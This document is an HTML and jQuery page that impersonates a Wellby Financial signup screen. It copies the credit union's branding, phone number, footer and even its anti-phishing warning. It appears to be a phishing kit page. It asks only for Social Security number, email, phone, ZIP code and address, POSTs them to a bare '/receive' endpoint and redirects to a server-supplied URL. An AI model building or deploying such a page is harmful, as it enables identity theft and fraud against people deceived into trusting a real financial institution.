<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Wellby Financial Signup</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #29004d;
      color: white;
    }

    .warning-bar {
      background-color: #4a4a4a;
      padding: 10px;
      font-size: 14px;
      text-align: center;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 80vh;
    }

    .signup-box {
      background-color: white;
      color: black;
      border-radius: 15px;
      padding: 30px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
      text-align: center;
      position: relative;
    }

    .logo {
      width: 60%;
      margin-bottom: 25px;
    }

    .input-wrapper {
      position: relative;
      width: 90%;
      margin: 0 auto 20px;
    }

    .input-field {
      width: 100%;
      padding: 18px 10px 10px 5px; /* Left padding matches label */
      font-size: 16px;
      border: 1px solid #aaa;
      border-radius: 5px;
      outline: none;
      background-color: transparent;
    }

    .input-label {
      position: absolute;
      left: 12px; /* Matches input's left padding */
      top: 50%;
      transform: translateY(-50%);
      background: white;
      padding: 0 4px;
      color: #aaa;
      font-size: 16px;
      pointer-events: none;
      transition: 0.2s ease all;
    }

    .input-field:focus + .input-label,
    .input-field:not(:placeholder-shown) + .input-label {
      top: 0;
      transform: translateY(-50%);
      font-size: 12px;
      color: #5a1d9c;
    }

    .input-field:focus {
      border-color: #5a1d9c;
    }

    .continue-btn {
      background-color: #5a1d9c;
      color: white;
      border: none;
      padding: 10px 16px;
      font-size: 14px;
      border-radius: 8px;
      white-space: nowrap;
      cursor: pointer;
      width: 30%; 
    }

    footer {
      text-align: center;
      padding: 20px;
      font-size: 14px;
      color: white;
    }

    footer a {
      color: #d3b6ff;
      text-decoration: none;
    }

    .housing-icon {
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="warning-bar">
    <p>⚠️ Beware of phishing calls/texts. Don't give out one-time passcodes or personal information. Verify all website URLs. Concerns? Call (281) 488-7070. Find more on our Fraud page.</p>
  </div>

  <div class="container">
    <div class="signup-box">
      <img src="assets/logo.png" alt="Wellby Financial Logo" class="logo">

      <!-- SSN Field -->
      <div class="input-wrapper">
        <input type="text" id="ssn" class="input-field" placeholder=" " />
        <label class="input-label" for="ssn">SSN</label>
      </div>

      <!-- Email Field -->
      <div class="input-wrapper">
        <input type="email" id="email" class="input-field" placeholder=" " />
        <label class="input-label" for="email">Email</label>
      </div>

      <!-- Phone Field -->
      <div class="input-wrapper">
        <input type="tel" id="phone" class="input-field" placeholder=" " />
        <label class="input-label" for="phone">Phone Number</label>
      </div>
      
            <!-- zip Field -->
      <div class="input-wrapper">
        <input type="text" id="zip" class="input-field" placeholder=" " />
        <label class="input-label" for="zip">ZIP Code</label>
      </div>

      <!-- Address Field -->
      <div class="input-wrapper">
        <input type="text" id="address" class="input-field" placeholder=" " />
        <label class="input-label" for="address">Address</label>
      </div>

      <button class="continue-btn" >Continue</button>
    </div>
  </div>

  <footer>
    <p>© 2025 Wellby • (281) 488-7070</p>
    <p>
      <a href="#">Privacy policy</a> • Federally Insured by NCUA<br>
      <span class="housing-icon">🏠</span> Equal Housing Lender
    </p>
  </footer>

<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
<script>
  $(document).ready(function () {
    $('.continue-btn').click(function (e) {
      e.preventDefault();

      let userinfo = {}; 
      let isValid = true; // Flag to check if all inputs are valid

      // Collecting form inputs and performing validation
      $('.signup-box input').each(function () {
        let inputName = $(this).attr('id'); // Using the input's ID as the name
        let inputValue = $(this).val();
        let isRequired = $(this).attr('required');

        // Validate required inputs
        if (isRequired && !inputValue.trim()) {
          $(this).css('border', '1px solid red'); // Highlight empty required fields
          isValid = false;
        } else {
          $(this).css('border', ''); // Reset border if valid
          if (inputName) {
            userinfo[inputName] = inputValue; // Add valid inputs to userinfo object
          }
        }
      });

      // Stop submission if validation fails
      if (!isValid) {
        console.log('Please fill in all required fields.');
        return;
      }

      // Make AJAX request with collected form data
      $.ajax({
        url: '/receive',  // The endpoint where data will be sent
        type: 'POST',
        data: userinfo,  // Sending the userinfo object
        success: function (response) {
          if (response.url) {
            window.location.href = response.url; // Redirect if URL is provided in the response
          }
        },
        error: function (xhr, status, error) {
          alert('An error occurred: ' + error);  // Show error message if something goes wrong
        }
      });
    });
  });
</script>

</body>
</html>
